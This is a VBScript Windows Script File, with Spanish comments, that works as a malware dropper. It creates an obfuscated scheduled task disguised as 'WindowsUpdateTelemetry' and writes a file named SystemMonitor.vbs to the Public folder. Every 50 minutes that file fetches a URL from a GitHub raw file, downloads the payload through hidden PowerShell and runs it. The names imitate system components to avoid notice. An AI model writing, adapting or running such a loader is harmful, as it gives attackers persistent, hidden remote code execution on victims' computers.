<job>
  <script language="VBScript">
    Option Explicit

    Dim objShell, tarea, cmdEliminar, cmdCrear
    Dim fso, archivo
    Dim xhr, urlRecortada
    Dim ejecutarShell
    Dim carpetaRand, archivoRand

    Set objShell = CreateObject("WScript.Shell")

    ' Nombre de la tarea con ofuscación ligera
    tarea = Chr(87) & Chr(105) & Chr(110) & Chr(100) & Chr(111) & Chr(119) & Chr(115) & Chr(85) & Chr(112) & Chr(100) & Chr(97) & Chr(116) & Chr(101) & Chr(84) & Chr(101) & Chr(108) & Chr(101) & Chr(109) & Chr(101) & Chr(116) & Chr(114) & Chr(121)

    ' Elimina tarea anterior para evitar duplicados
    cmdEliminar = "schtasks /Delete /TN """ & tarea & """ /F"
    
    ' Crea nueva tarea cada 50 minutos (no 30)
    cmdCrear = "schtasks /Create /SC MINUTE /MO 50 /TN """ & tarea & """ /TR ""wscript.exe C:\Users\Public\SystemMonitor.vbs"" /F"

    objShell.Run cmdEliminar, 0, True
    objShell.Run cmdCrear, 0, True

    carpetaRand = "C:\Users\Public\"
    archivoRand = "SystemMonitor.vbs"  ' ← CAMBIO AQUÍ: de Tarea.vbs a SystemMonitor.vbs

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set archivo = fso.CreateTextFile(carpetaRand & archivoRand, True)

    ' Descarga cmd.txt desde GitHub raw (más rápido que XAMPP)
    archivo.WriteLine "Set xhr = CreateObject(""MSXML2.XMLHTTP"")"
    archivo.WriteLine "xhr.Open ""GET"", ""https://raw.githubusercontent.com/ABBASABBUD100/Notificaciones254/main/cmd.txt"", False"
    archivo.WriteLine "urlRecortada = Trim(Replace(xhr.responseText, vbCrLf, """"))"
    
    ' Ejecuta el JS con PowerShell oculto
    archivo.WriteLine "If urlRecortada <> """" Then"
    archivo.WriteLine "  Set ejecutarShell = CreateObject(""WScript.Shell"")"
    archivo.WriteLine "  ejecutarShell.Run ""powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri '"" & urlRecortada & ""' -OutFile 'C:\Users\Public\HealthMonitors.js'; Start-Process 'wscript.exe' -ArgumentList 'C:\Users\Public\HealthMonitors.js'"", 0, False"
    archivo.WriteLine "End If"

    archivo.Close
  </script>
</job>
